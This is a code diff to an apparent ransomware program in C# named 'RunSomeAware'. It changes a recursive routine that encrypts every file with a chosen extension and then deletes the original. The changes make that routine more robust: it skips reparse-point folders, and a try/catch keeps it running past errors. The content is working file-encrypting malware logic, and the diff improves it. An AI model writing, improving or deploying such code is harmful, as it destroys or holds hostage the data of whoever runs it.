@@ -1,4 +1,4 @@
-﻿using System;
+using System;
 using System.IO;
 using System.Security.Cryptography;
 using System.Text;
@@ -20,14 +20,22 @@ class RunSomeAware
     }
     static bool Start(string ParentDir)
     {
+        if (new DirectoryInfo(ParentDir).Attributes.ToString().ToLower().Contains("reparsepoint,")) return true;
         foreach (string file in Directory.GetFiles(ParentDir))
         {
             if (Contain(new FileInfo(file).Extension, AllowedExt))
             {
-                Crypt(file);
-                Console.WriteLine((file.EndsWith(CrypterExt) ? "De" : "En") + "crypted : " + file);
-                BytesRead += new FileInfo(file).Length;
-                File.Delete(file);
+                try
+                {
+                    Crypt(file);
+                    BytesRead += new FileInfo(file).Length;
+                    File.Delete(file);
+                    Console.WriteLine((file.EndsWith(CrypterExt) ? "De" : "En") + "crypted : " + file);
+                }
+                catch (Exception)
+                {
+                    continue;
+                }
             }
         }
         foreach (string dir in Directory.GetDirectories(ParentDir)) Start(dir);
